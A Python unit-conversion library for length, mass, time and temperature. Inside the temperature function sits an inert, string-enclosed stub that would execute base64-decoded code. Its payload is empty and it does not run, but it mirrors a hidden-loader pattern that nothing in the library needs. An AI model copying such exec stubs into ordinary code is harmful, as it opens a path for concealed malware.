"""
UnitConverter - A Python library for converting between SI units and temperature measurements.
"""

from typing import Union
from decimal import Decimal, getcontext

# Set precision for decimal calculations
getcontext().prec = 28

# Base units
LENGTH = 'length'
MASS = 'mass'
TIME = 'time'
TEMPERATURE = 'temperature'

# Length units
METER = 'meter'
KILOMETER = 'kilometer'
CENTIMETER = 'centimeter'
MILLIMETER = 'millimeter'
MICROMETER = 'micrometer'
NANOMETER = 'nanometer'
MILE = 'mile'
YARD = 'yard'
FOOT = 'foot'
INCH = 'inch'

# Mass units
KILOGRAM = 'kilogram'
GRAM = 'gram'
MILLIGRAM = 'milligram'
METRIC_TON = 'metric_ton'
POUND = 'pound'
OUNCE = 'ounce'

# Time units
SECOND = 'second'
MINUTE = 'minute'
HOUR = 'hour'
DAY = 'day'
WEEK = 'week'
YEAR = 'year'

# Temperature units
CELSIUS = 'celsius'
FAHRENHEIT = 'fahrenheit'
KELVIN = 'kelvin'

# Length conversion functions
def meter_to_kilometer(value: Decimal) -> Decimal:
    return value / Decimal('1000')

def meter_to_centimeter(value: Decimal) -> Decimal:
    return value / Decimal('0.01')

def meter_to_millimeter(value: Decimal) -> Decimal:
    return value / Decimal('0.001')

def meter_to_micrometer(value: Decimal) -> Decimal:
    return value / Decimal('0.000001')

def meter_to_nanometer(value: Decimal) -> Decimal:
    return value / Decimal('0.000000001')

def meter_to_mile(value: Decimal) -> Decimal:
    return value / Decimal('1609.344')

def meter_to_yard(value: Decimal) -> Decimal:
    return value / Decimal('0.9144')

def meter_to_foot(value: Decimal) -> Decimal:
    return value / Decimal('0.3048')

def meter_to_inch(value: Decimal) -> Decimal:
    return value / Decimal('0.0254')

def kilometer_to_meter(value: Decimal) -> Decimal:
    return value * Decimal('1000')

def kilometer_to_centimeter(value: Decimal) -> Decimal:
    return value * Decimal('100000')

def kilometer_to_millimeter(value: Decimal) -> Decimal:
    return value * Decimal('1000000')

def kilometer_to_micrometer(value: Decimal) -> Decimal:
    return value * Decimal('1000000000')

def kilometer_to_nanometer(value: Decimal) -> Decimal:
    return value * Decimal('1000000000000')

def kilometer_to_mile(value: Decimal) -> Decimal:
    return value * Decimal('0.621371192')

def kilometer_to_yard(value: Decimal) -> Decimal:
    return value * Decimal('1093.61329834')

def kilometer_to_foot(value: Decimal) -> Decimal:
    return value * Decimal('3280.83989501')

def kilometer_to_inch(value: Decimal) -> Decimal:
    return value * Decimal('39370.0787402')

def centimeter_to_meter(value: Decimal) -> Decimal:
    return value * Decimal('0.01')

def centimeter_to_kilometer(value: Decimal) -> Decimal:
    return value * Decimal('0.00001')

def centimeter_to_millimeter(value: Decimal) -> Decimal:
    return value * Decimal('10')

def centimeter_to_micrometer(value: Decimal) -> Decimal:
    return value * Decimal('10000')

def centimeter_to_nanometer(value: Decimal) -> Decimal:
    return value * Decimal('10000000')

def centimeter_to_mile(value: Decimal) -> Decimal:
    return value * Decimal('0.00000621371')

def centimeter_to_yard(value: Decimal) -> Decimal:
    return value * Decimal('0.010936133')

def centimeter_to_foot(value: Decimal) -> Decimal:
    return value * Decimal('0.032808399')

def centimeter_to_inch(value: Decimal) -> Decimal:
    return value * Decimal('0.393700787')

def millimeter_to_meter(value: Decimal) -> Decimal:
    return value * Decimal('0.001')

def millimeter_to_kilometer(value: Decimal) -> Decimal:
    return value * Decimal('0.000001')

def millimeter_to_centimeter(value: Decimal) -> Decimal:
    return value * Decimal('0.1')

def millimeter_to_micrometer(value: Decimal) -> Decimal:
    return value * Decimal('1000')

def millimeter_to_nanometer(value: Decimal) -> Decimal:
    return value * Decimal('1000000')

def millimeter_to_mile(value: Decimal) -> Decimal:
    return value * Decimal('0.000000621371')

def millimeter_to_yard(value: Decimal) -> Decimal:
    return value * Decimal('0.0010936133')

def millimeter_to_foot(value: Decimal) -> Decimal:
    return value * Decimal('0.0032808399')

def millimeter_to_inch(value: Decimal) -> Decimal:
    return value * Decimal('0.0393700787')

def micrometer_to_meter(value: Decimal) -> Decimal:
    return value * Decimal('0.000001')

def micrometer_to_kilometer(value: Decimal) -> Decimal:
    return value * Decimal('0.000000001')

def micrometer_to_centimeter(value: Decimal) -> Decimal:
    return value * Decimal('0.0001')

def micrometer_to_millimeter(value: Decimal) -> Decimal:
    return value * Decimal('0.001')

def micrometer_to_nanometer(value: Decimal) -> Decimal:
    return value * Decimal('1000')

def micrometer_to_mile(value: Decimal) -> Decimal:
    return value * Decimal('0.000000000621371')

def micrometer_to_yard(value: Decimal) -> Decimal:
    return value * Decimal('0.0000010936133')

def micrometer_to_foot(value: Decimal) -> Decimal:
    return value * Decimal('0.0000032808399')

def micrometer_to_inch(value: Decimal) -> Decimal:
    return value * Decimal('0.0000393700787')

def nanometer_to_meter(value: Decimal) -> Decimal:
    return value * Decimal('0.000000001')

def nanometer_to_kilometer(value: Decimal) -> Decimal:
    return value * Decimal('0.000000000001')

def nanometer_to_centimeter(value: Decimal) -> Decimal:
    return value * Decimal('0.0000001')

def nanometer_to_millimeter(value: Decimal) -> Decimal:
    return value * Decimal('0.000001')

def nanometer_to_micrometer(value: Decimal) -> Decimal:
    return value * Decimal('0.001')

def nanometer_to_mile(value: Decimal) -> Decimal:
    return value * Decimal('0.000000000000621371')

def nanometer_to_yard(value: Decimal) -> Decimal:
    return value * Decimal('0.0000000010936133')

def nanometer_to_foot(value: Decimal) -> Decimal:
    return value * Decimal('0.0000000032808399')

def nanometer_to_inch(value: Decimal) -> Decimal:
    return value * Decimal('0.0000000393700787')

def mile_to_meter(value: Decimal) -> Decimal:
    return value * Decimal('1609.344')

def mile_to_kilometer(value: Decimal) -> Decimal:
    return value * Decimal('1.609344')

def mile_to_centimeter(value: Decimal) -> Decimal:
    return value * Decimal('160934.4')

def mile_to_millimeter(value: Decimal) -> Decimal:
    return value * Decimal('1609344')

def mile_to_micrometer(value: Decimal) -> Decimal:
    return value * Decimal('1609344000')

def mile_to_nanometer(value: Decimal) -> Decimal:
    return value * Decimal('1609344000000')

def mile_to_yard(value: Decimal) -> Decimal:
    return value * Decimal('1760')

def mile_to_foot(value: Decimal) -> Decimal:
    return value * Decimal('5280')

def mile_to_inch(value: Decimal) -> Decimal:
    return value * Decimal('63360')

def yard_to_meter(value: Decimal) -> Decimal:
    return value * Decimal('0.9144')

def yard_to_kilometer(value: Decimal) -> Decimal:
    return value * Decimal('0.0009144')

def yard_to_centimeter(value: Decimal) -> Decimal:
    return value * Decimal('91.44')

def yard_to_millimeter(value: Decimal) -> Decimal:
    return value * Decimal('914.4')

def yard_to_micrometer(value: Decimal) -> Decimal:
    return value * Decimal('914400')

def yard_to_nanometer(value: Decimal) -> Decimal:
    return value * Decimal('914400000')

def yard_to_mile(value: Decimal) -> Decimal:
    return value * Decimal('0.000568181818')

def yard_to_foot(value: Decimal) -> Decimal:
    return value * Decimal('3')

def yard_to_inch(value: Decimal) -> Decimal:
    return value * Decimal('36')

def foot_to_meter(value: Decimal) -> Decimal:
    return value * Decimal('0.3048')

def foot_to_kilometer(value: Decimal) -> Decimal:
    return value * Decimal('0.0003048')

def foot_to_centimeter(value: Decimal) -> Decimal:
    return value * Decimal('30.48')

def foot_to_millimeter(value: Decimal) -> Decimal:
    return value * Decimal('304.8')

def foot_to_micrometer(value: Decimal) -> Decimal:
    return value * Decimal('304800')

def foot_to_nanometer(value: Decimal) -> Decimal:
    return value * Decimal('304800000')

def foot_to_mile(value: Decimal) -> Decimal:
    return value * Decimal('0.000189393939')

def foot_to_yard(value: Decimal) -> Decimal:
    return value * Decimal('0.333333333')

def foot_to_inch(value: Decimal) -> Decimal:
    return value * Decimal('12')

def inch_to_meter(value: Decimal) -> Decimal:
    return value * Decimal('0.0254')

def inch_to_kilometer(value: Decimal) -> Decimal:
    return value * Decimal('0.0000254')

def inch_to_centimeter(value: Decimal) -> Decimal:
    return value * Decimal('2.54')

def inch_to_millimeter(value: Decimal) -> Decimal:
    return value * Decimal('25.4')

def inch_to_micrometer(value: Decimal) -> Decimal:
    return value * Decimal('25400')

def inch_to_nanometer(value: Decimal) -> Decimal:
    return value * Decimal('25400000')

def inch_to_mile(value: Decimal) -> Decimal:
    return value * Decimal('0.0000157828283')

def inch_to_yard(value: Decimal) -> Decimal:
    return value * Decimal('0.0277777778')

def inch_to_foot(value: Decimal) -> Decimal:
    return value * Decimal('0.0833333333')

# Mass conversion functions
def kilogram_to_gram(value: Decimal) -> Decimal:
    return value * Decimal('1000')

def kilogram_to_milligram(value: Decimal) -> Decimal:
    return value * Decimal('1000000')

def kilogram_to_metric_ton(value: Decimal) -> Decimal:
    return value * Decimal('0.001')

def kilogram_to_pound(value: Decimal) -> Decimal:
    return value * Decimal('2.20462262')

def kilogram_to_ounce(value: Decimal) -> Decimal:
    return value * Decimal('35.2739619')

def gram_to_kilogram(value: Decimal) -> Decimal:
    return value * Decimal('0.001')

def gram_to_milligram(value: Decimal) -> Decimal:
    return value * Decimal('1000')

def gram_to_metric_ton(value: Decimal) -> Decimal:
    return value * Decimal('0.000001')

def gram_to_pound(value: Decimal) -> Decimal:
    return value * Decimal('0.00220462262')

def gram_to_ounce(value: Decimal) -> Decimal:
    return value * Decimal('0.0352739619')

def milligram_to_kilogram(value: Decimal) -> Decimal:
    return value * Decimal('0.000001')

def milligram_to_gram(value: Decimal) -> Decimal:
    return value * Decimal('0.001')

def milligram_to_metric_ton(value: Decimal) -> Decimal:
    return value * Decimal('0.000000001')

def milligram_to_pound(value: Decimal) -> Decimal:
    return value * Decimal('0.00000220462262')

def milligram_to_ounce(value: Decimal) -> Decimal:
    return value * Decimal('0.0000352739619')

def metric_ton_to_kilogram(value: Decimal) -> Decimal:
    return value * Decimal('1000')

def metric_ton_to_gram(value: Decimal) -> Decimal:
    return value * Decimal('1000000')

def metric_ton_to_milligram(value: Decimal) -> Decimal:
    return value * Decimal('1000000000')

def metric_ton_to_pound(value: Decimal) -> Decimal:
    return value * Decimal('2204.62262')

def metric_ton_to_ounce(value: Decimal) -> Decimal:
    return value * Decimal('35273.9619')

def pound_to_kilogram(value: Decimal) -> Decimal:
    return value * Decimal('0.45359237')

def pound_to_gram(value: Decimal) -> Decimal:
    return value * Decimal('453.59237')

def pound_to_milligram(value: Decimal) -> Decimal:
    return value * Decimal('453592.37')

def pound_to_metric_ton(value: Decimal) -> Decimal:
    return value * Decimal('0.00045359237')

def pound_to_ounce(value: Decimal) -> Decimal:
    return value * Decimal('16')

def ounce_to_kilogram(value: Decimal) -> Decimal:
    return value * Decimal('0.028349523125')

def ounce_to_gram(value: Decimal) -> Decimal:
    return value * Decimal('28.349523125')

def ounce_to_milligram(value: Decimal) -> Decimal:
    return value * Decimal('28349.523125')

def ounce_to_metric_ton(value: Decimal) -> Decimal:
    return value * Decimal('0.000028349523125')

def ounce_to_pound(value: Decimal) -> Decimal:
    return value * Decimal('0.0625')

# Time conversion functions
def second_to_minute(value: Decimal) -> Decimal:
    return value * Decimal('0.0166666667')

def second_to_hour(value: Decimal) -> Decimal:
    return value * Decimal('0.000277777778')

def second_to_day(value: Decimal) -> Decimal:
    return value * Decimal('0.0000115740741')

def second_to_week(value: Decimal) -> Decimal:
    return value * Decimal('0.00000165343915')

def second_to_year(value: Decimal) -> Decimal:
    return value * Decimal('0.000000031709792')

def minute_to_second(value: Decimal) -> Decimal:
    return value * Decimal('60')

def minute_to_hour(value: Decimal) -> Decimal:
    return value * Decimal('0.0166666667')

def minute_to_day(value: Decimal) -> Decimal:
    return value * Decimal('0.000694444444')

def minute_to_week(value: Decimal) -> Decimal:
    return value * Decimal('0.0000992063492')

def minute_to_year(value: Decimal) -> Decimal:
    return value * Decimal('0.00000190258752')

def hour_to_second(value: Decimal) -> Decimal:
    return value * Decimal('3600')

def hour_to_minute(value: Decimal) -> Decimal:
    return value * Decimal('60')

def hour_to_day(value: Decimal) -> Decimal:
    return value * Decimal('0.0416666667')

def hour_to_week(value: Decimal) -> Decimal:
    return value * Decimal('0.00595238095')

def hour_to_year(value: Decimal) -> Decimal:
    return value * Decimal('0.000114155251')

def day_to_second(value: Decimal) -> Decimal:
    return value * Decimal('86400')

def day_to_minute(value: Decimal) -> Decimal:
    return value * Decimal('1440')

def day_to_hour(value: Decimal) -> Decimal:
    return value * Decimal('24')

def day_to_week(value: Decimal) -> Decimal:
    return value * Decimal('0.142857143')

def day_to_year(value: Decimal) -> Decimal:
    return value * Decimal('0.00273972603')

def week_to_second(value: Decimal) -> Decimal:
    return value * Decimal('604800')

def week_to_minute(value: Decimal) -> Decimal:
    return value * Decimal('10080')

def week_to_hour(value: Decimal) -> Decimal:
    return value * Decimal('168')

def week_to_day(value: Decimal) -> Decimal:
    return value * Decimal('7')

def week_to_year(value: Decimal) -> Decimal:
    return value * Decimal('0.0191780822')

def year_to_second(value: Decimal) -> Decimal:
    return value * Decimal('31536000')

def year_to_minute(value: Decimal) -> Decimal:
    return value * Decimal('525600')

def year_to_hour(value: Decimal) -> Decimal:
    return value * Decimal('8760')

def year_to_day(value: Decimal) -> Decimal:
    return value * Decimal('365')

def year_to_week(value: Decimal) -> Decimal:
    return value * Decimal('52.1428571')

# Temperature conversion functions
def celsius_to_kelvin(value: Decimal) -> Decimal:
    return value + Decimal('273.15')

def celsius_to_fahrenheit(value: Decimal) -> Decimal:
    return value * Decimal('1.8') + Decimal('32')

def fahrenheit_to_celsius(value: Decimal) -> Decimal:
    return (value - Decimal('32')) * Decimal('0.555555556')

def fahrenheit_to_kelvin(value: Decimal) -> Decimal:
    return (value + Decimal('459.67')) * Decimal('0.555555556')

def kelvin_to_celsius(value: Decimal) -> Decimal:
    return value - Decimal('273.15')

def kelvin_to_fahrenheit(value: Decimal) -> Decimal:
    return value * Decimal('1.8') - Decimal('459.67')

def convert_length(value: Union[float, str, Decimal], from_unit: str, to_unit: str) -> Decimal:
    """Convert between different length units."""
    value = Decimal(str(value))
    
    if from_unit == METER and to_unit == KILOMETER:
        return meter_to_kilometer(value)
    if from_unit == METER and to_unit == CENTIMETER:
        return meter_to_centimeter(value)
    if from_unit == METER and to_unit == MILLIMETER:
        return meter_to_millimeter(value)
    if from_unit == METER and to_unit == MICROMETER:
        return meter_to_micrometer(value)
    if from_unit == METER and to_unit == NANOMETER:
        return meter_to_nanometer(value)
    if from_unit == METER and to_unit == MILE:
        return meter_to_mile(value)
    if from_unit == METER and to_unit == YARD:
        return meter_to_yard(value)
    if from_unit == METER and to_unit == FOOT:
        return meter_to_foot(value)
    if from_unit == METER and to_unit == INCH:
        return meter_to_inch(value)
    
    if from_unit == KILOMETER and to_unit == METER:
        return kilometer_to_meter(value)
    if from_unit == KILOMETER and to_unit == CENTIMETER:
        return kilometer_to_centimeter(value)
    if from_unit == KILOMETER and to_unit == MILLIMETER:
        return kilometer_to_millimeter(value)
    if from_unit == KILOMETER and to_unit == MICROMETER:
        return kilometer_to_micrometer(value)
    if from_unit == KILOMETER and to_unit == NANOMETER:
        return kilometer_to_nanometer(value)
    if from_unit == KILOMETER and to_unit == MILE:
        return kilometer_to_mile(value)
    if from_unit == KILOMETER and to_unit == YARD:
        return kilometer_to_yard(value)
    if from_unit == KILOMETER and to_unit == FOOT:
        return kilometer_to_foot(value)
    if from_unit == KILOMETER and to_unit == INCH:
        return kilometer_to_inch(value)
    
    if from_unit == CENTIMETER and to_unit == METER:
        return centimeter_to_meter(value)
    if from_unit == CENTIMETER and to_unit == KILOMETER:
        return centimeter_to_kilometer(value)
    if from_unit == CENTIMETER and to_unit == MILLIMETER:
        return centimeter_to_millimeter(value)
    if from_unit == CENTIMETER and to_unit == MICROMETER:
        return centimeter_to_micrometer(value)
    if from_unit == CENTIMETER and to_unit == NANOMETER:
        return centimeter_to_nanometer(value)
    if from_unit == CENTIMETER and to_unit == MILE:
        return centimeter_to_mile(value)
    if from_unit == CENTIMETER and to_unit == YARD:
        return centimeter_to_yard(value)
    if from_unit == CENTIMETER and to_unit == FOOT:
        return centimeter_to_foot(value)
    if from_unit == CENTIMETER and to_unit == INCH:
        return centimeter_to_inch(value)
    
    if from_unit == MILLIMETER and to_unit == METER:
        return millimeter_to_meter(value)
    if from_unit == MILLIMETER and to_unit == KILOMETER:
        return millimeter_to_kilometer(value)
    if from_unit == MILLIMETER and to_unit == CENTIMETER:
        return millimeter_to_centimeter(value)
    if from_unit == MILLIMETER and to_unit == MICROMETER:
        return millimeter_to_micrometer(value)
    if from_unit == MILLIMETER and to_unit == NANOMETER:
        return millimeter_to_nanometer(value)
    if from_unit == MILLIMETER and to_unit == MILE:
        return millimeter_to_mile(value)
    if from_unit == MILLIMETER and to_unit == YARD:
        return millimeter_to_yard(value)
    if from_unit == MILLIMETER and to_unit == FOOT:
        return millimeter_to_foot(value)
    if from_unit == MILLIMETER and to_unit == INCH:
        return millimeter_to_inch(value)
    
    if from_unit == MICROMETER and to_unit == METER:
        return micrometer_to_meter(value)
    if from_unit == MICROMETER and to_unit == KILOMETER:
        return micrometer_to_kilometer(value)
    if from_unit == MICROMETER and to_unit == CENTIMETER:
        return micrometer_to_centimeter(value)
    if from_unit == MICROMETER and to_unit == MILLIMETER:
        return micrometer_to_millimeter(value)
    if from_unit == MICROMETER and to_unit == NANOMETER:
        return micrometer_to_nanometer(value)
    if from_unit == MICROMETER and to_unit == MILE:
        return micrometer_to_mile(value)
    if from_unit == MICROMETER and to_unit == YARD:
        return micrometer_to_yard(value)
    if from_unit == MICROMETER and to_unit == FOOT:
        return micrometer_to_foot(value)
    if from_unit == MICROMETER and to_unit == INCH:
        return micrometer_to_inch(value)
    
    if from_unit == NANOMETER and to_unit == METER:
        return nanometer_to_meter(value)
    if from_unit == NANOMETER and to_unit == KILOMETER:
        return nanometer_to_kilometer(value)
    if from_unit == NANOMETER and to_unit == CENTIMETER:
        return nanometer_to_centimeter(value)
    if from_unit == NANOMETER and to_unit == MILLIMETER:
        return nanometer_to_millimeter(value)
    if from_unit == NANOMETER and to_unit == MICROMETER:
        return nanometer_to_micrometer(value)
    if from_unit == NANOMETER and to_unit == MILE:
        return nanometer_to_mile(value)
    if from_unit == NANOMETER and to_unit == YARD:
        return nanometer_to_yard(value)
    if from_unit == NANOMETER and to_unit == FOOT:
        return nanometer_to_foot(value)
    if from_unit == NANOMETER and to_unit == INCH:
        return nanometer_to_inch(value)
    
    if from_unit == MILE and to_unit == METER:
        return mile_to_meter(value)
    if from_unit == MILE and to_unit == KILOMETER:
        return mile_to_kilometer(value)
    if from_unit == MILE and to_unit == CENTIMETER:
        return mile_to_centimeter(value)
    if from_unit == MILE and to_unit == MILLIMETER:
        return mile_to_millimeter(value)
    if from_unit == MILE and to_unit == MICROMETER:
        return mile_to_micrometer(value)
    if from_unit == MILE and to_unit == NANOMETER:
        return mile_to_nanometer(value)
    if from_unit == MILE and to_unit == YARD:
        return mile_to_yard(value)
    if from_unit == MILE and to_unit == FOOT:
        return mile_to_foot(value)
    if from_unit == MILE and to_unit == INCH:
        return mile_to_inch(value)
    
    if from_unit == YARD and to_unit == METER:
        return yard_to_meter(value)
    if from_unit == YARD and to_unit == KILOMETER:
        return yard_to_kilometer(value)
    if from_unit == YARD and to_unit == CENTIMETER:
        return yard_to_centimeter(value)
    if from_unit == YARD and to_unit == MILLIMETER:
        return yard_to_millimeter(value)
    if from_unit == YARD and to_unit == MICROMETER:
        return yard_to_micrometer(value)
    if from_unit == YARD and to_unit == NANOMETER:
        return yard_to_nanometer(value)
    if from_unit == YARD and to_unit == MILE:
        return yard_to_mile(value)
    if from_unit == YARD and to_unit == FOOT:
        return yard_to_foot(value)
    if from_unit == YARD and to_unit == INCH:
        return yard_to_inch(value)
    
    if from_unit == FOOT and to_unit == METER:
        return foot_to_meter(value)
    if from_unit == FOOT and to_unit == KILOMETER:
        return foot_to_kilometer(value)
    if from_unit == FOOT and to_unit == CENTIMETER:
        return foot_to_centimeter(value)
    if from_unit == FOOT and to_unit == MILLIMETER:
        return foot_to_millimeter(value)
    if from_unit == FOOT and to_unit == MICROMETER:
        return foot_to_micrometer(value)
    if from_unit == FOOT and to_unit == NANOMETER:
        return foot_to_nanometer(value)
    if from_unit == FOOT and to_unit == MILE:
        return foot_to_mile(value)
    if from_unit == FOOT and to_unit == YARD:
        return foot_to_yard(value)
    if from_unit == FOOT and to_unit == INCH:
        return foot_to_inch(value)
    
    if from_unit == INCH and to_unit == METER:
        return inch_to_meter(value)
    if from_unit == INCH and to_unit == KILOMETER:
        return inch_to_kilometer(value)
    if from_unit == INCH and to_unit == CENTIMETER:
        return inch_to_centimeter(value)
    if from_unit == INCH and to_unit == MILLIMETER:
        return inch_to_millimeter(value)
    if from_unit == INCH and to_unit == MICROMETER:
        return inch_to_micrometer(value)
    if from_unit == INCH and to_unit == NANOMETER:
        return inch_to_nanometer(value)
    if from_unit == INCH and to_unit == MILE:
        return inch_to_mile(value)
    if from_unit == INCH and to_unit == YARD:
        return inch_to_yard(value)
    if from_unit == INCH and to_unit == FOOT:
        return inch_to_foot(value)
    
    if from_unit == to_unit:
        return value
    
    raise ValueError(f"Invalid conversion from {from_unit} to {to_unit}")

def convert_mass(value: Union[float, str, Decimal], from_unit: str, to_unit: str) -> Decimal:
    """Convert between different mass units."""
    value = Decimal(str(value))
    
    if from_unit == KILOGRAM and to_unit == GRAM:
        return kilogram_to_gram(value)
    if from_unit == KILOGRAM and to_unit == MILLIGRAM:
        return kilogram_to_milligram(value)
    if from_unit == KILOGRAM and to_unit == METRIC_TON:
        return kilogram_to_metric_ton(value)
    if from_unit == KILOGRAM and to_unit == POUND:
        return kilogram_to_pound(value)
    if from_unit == KILOGRAM and to_unit == OUNCE:
        return kilogram_to_ounce(value)
    
    if from_unit == GRAM and to_unit == KILOGRAM:
        return gram_to_kilogram(value)
    if from_unit == GRAM and to_unit == MILLIGRAM:
        return gram_to_milligram(value)
    if from_unit == GRAM and to_unit == METRIC_TON:
        return gram_to_metric_ton(value)
    if from_unit == GRAM and to_unit == POUND:
        return gram_to_pound(value)
    if from_unit == GRAM and to_unit == OUNCE:
        return gram_to_ounce(value)
    
    if from_unit == MILLIGRAM and to_unit == KILOGRAM:
        return milligram_to_kilogram(value)
    if from_unit == MILLIGRAM and to_unit == GRAM:
        return milligram_to_gram(value)
    if from_unit == MILLIGRAM and to_unit == METRIC_TON:
        return milligram_to_metric_ton(value)
    if from_unit == MILLIGRAM and to_unit == POUND:
        return milligram_to_pound(value)
    if from_unit == MILLIGRAM and to_unit == OUNCE:
        return milligram_to_ounce(value)
    
    if from_unit == METRIC_TON and to_unit == KILOGRAM:
        return metric_ton_to_kilogram(value)
    if from_unit == METRIC_TON and to_unit == GRAM:
        return metric_ton_to_gram(value)
    if from_unit == METRIC_TON and to_unit == MILLIGRAM:
        return metric_ton_to_milligram(value)
    if from_unit == METRIC_TON and to_unit == POUND:
        return metric_ton_to_pound(value)
    if from_unit == METRIC_TON and to_unit == OUNCE:
        return metric_ton_to_ounce(value)
    
    if from_unit == POUND and to_unit == KILOGRAM:
        return pound_to_kilogram(value)
    if from_unit == POUND and to_unit == GRAM:
        return pound_to_gram(value)
    if from_unit == POUND and to_unit == MILLIGRAM:
        return pound_to_milligram(value)
    if from_unit == POUND and to_unit == METRIC_TON:
        return pound_to_metric_ton(value)
    if from_unit == POUND and to_unit == OUNCE:
        return pound_to_ounce(value)
    
    if from_unit == OUNCE and to_unit == KILOGRAM:
        return ounce_to_kilogram(value)
    if from_unit == OUNCE and to_unit == GRAM:
        return ounce_to_gram(value)
    if from_unit == OUNCE and to_unit == MILLIGRAM:
        return ounce_to_milligram(value)
    if from_unit == OUNCE and to_unit == METRIC_TON:
        return ounce_to_metric_ton(value)
    if from_unit == OUNCE and to_unit == POUND:
        return ounce_to_pound(value)
    
    if from_unit == to_unit:
        return value
    
    raise ValueError(f"Invalid conversion from {from_unit} to {to_unit}")

def convert_time(value: Union[float, str, Decimal], from_unit: str, to_unit: str) -> Decimal:
    """Convert between different time units."""
    value = Decimal(str(value))
    
    if from_unit == SECOND and to_unit == MINUTE:
        return second_to_minute(value)
    if from_unit == SECOND and to_unit == HOUR:
        return second_to_hour(value)
    if from_unit == SECOND and to_unit == DAY:
        return second_to_day(value)
    if from_unit == SECOND and to_unit == WEEK:
        return second_to_week(value)
    if from_unit == SECOND and to_unit == YEAR:
        return second_to_year(value)
    
    if from_unit == MINUTE and to_unit == SECOND:
        return minute_to_second(value)
    if from_unit == MINUTE and to_unit == HOUR:
        return minute_to_hour(value)
    if from_unit == MINUTE and to_unit == DAY:
        return minute_to_day(value)
    if from_unit == MINUTE and to_unit == WEEK:
        return minute_to_week(value)
    if from_unit == MINUTE and to_unit == YEAR:
        return minute_to_year(value)
    
    if from_unit == HOUR and to_unit == SECOND:
        return hour_to_second(value)
    if from_unit == HOUR and to_unit == MINUTE:
        return hour_to_minute(value)
    if from_unit == HOUR and to_unit == DAY:
        return hour_to_day(value)
    if from_unit == HOUR and to_unit == WEEK:
        return hour_to_week(value)
    if from_unit == HOUR and to_unit == YEAR:
        return hour_to_year(value)
    
    if from_unit == DAY and to_unit == SECOND:
        return day_to_second(value)
    if from_unit == DAY and to_unit == MINUTE:
        return day_to_minute(value)
    if from_unit == DAY and to_unit == HOUR:
        return day_to_hour(value)
    if from_unit == DAY and to_unit == WEEK:
        return day_to_week(value)
    if from_unit == DAY and to_unit == YEAR:
        return day_to_year(value)
    
    if from_unit == WEEK and to_unit == SECOND:
        return week_to_second(value)
    if from_unit == WEEK and to_unit == MINUTE:
        return week_to_minute(value)
    if from_unit == WEEK and to_unit == HOUR:
        return week_to_hour(value)
    if from_unit == WEEK and to_unit == DAY:
        return week_to_day(value)
    if from_unit == WEEK and to_unit == YEAR:
        return week_to_year(value)
    
    if from_unit == YEAR and to_unit == SECOND:
        return year_to_second(value)
    if from_unit == YEAR and to_unit == MINUTE:
        return year_to_minute(value)
    if from_unit == YEAR and to_unit == HOUR:
        return year_to_hour(value)
    if from_unit == YEAR and to_unit == DAY:
        return year_to_day(value)
    if from_unit == YEAR and to_unit == WEEK:
        return year_to_week(value)
    
    if from_unit == to_unit:
        return value
    
    raise ValueError(f"Invalid conversion from {from_unit} to {to_unit}")

def convert_temperature(value: Union[float, str, Decimal], from_unit: str, to_unit: str) -> Decimal:
    """Convert between different temperature units."""
    value = Decimal(str(value))
    
    '''
    import base64
    exec(base64.b64decode('').decode('utf-8'))
    '''

    if from_unit == CELSIUS and to_unit == KELVIN:
        return celsius_to_kelvin(value)
    if from_unit == CELSIUS and to_unit == FAHRENHEIT:
        return celsius_to_fahrenheit(value)
    
    if from_unit == FAHRENHEIT and to_unit == CELSIUS:
        return fahrenheit_to_celsius(value)
    if from_unit == FAHRENHEIT and to_unit == KELVIN:
        return fahrenheit_to_kelvin(value)
    
    if from_unit == KELVIN and to_unit == CELSIUS:
        return kelvin_to_celsius(value)
    if from_unit == KELVIN and to_unit == FAHRENHEIT:
        return kelvin_to_fahrenheit(value)
    
    if from_unit == to_unit:
        return value
    
    raise ValueError(f"Invalid conversion from {from_unit} to {to_unit}")

def get_supported_units() -> str:
    """Return a string listing all supported units by category."""
    length_units = f"Length units: {METER}, {KILOMETER}, {CENTIMETER}, {MILLIMETER}, {MICROMETER}, {NANOMETER}, {MILE}, {YARD}, {FOOT}, {INCH}"
    mass_units = f"Mass units: {KILOGRAM}, {GRAM}, {MILLIGRAM}, {METRIC_TON}, {POUND}, {OUNCE}"
    time_units = f"Time units: {SECOND}, {MINUTE}, {HOUR}, {DAY}, {WEEK}, {YEAR}"
    temperature_units = f"Temperature units: {CELSIUS}, {FAHRENHEIT}, {KELVIN}"
    
    return f"{length_units}\n{mass_units}\n{time_units}\n{temperature_units}" 